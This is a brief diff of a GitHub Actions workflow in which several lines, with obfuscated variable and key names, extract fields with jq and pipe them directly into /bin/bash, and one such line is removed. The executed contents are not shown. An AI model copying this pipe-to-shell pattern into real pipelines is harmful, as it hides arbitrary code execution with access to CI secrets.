@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$ykcum862" | jq -r .ltl44211 | /bin/bash
           echo $emfay94 | jq -r .mdk3107 | /bin/bash
           printf '%s' "$bqw3817" | jq -r .bt6 | /bin/bash
-          printf '%s' "$gi0" | jq -r .gaxg70680 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
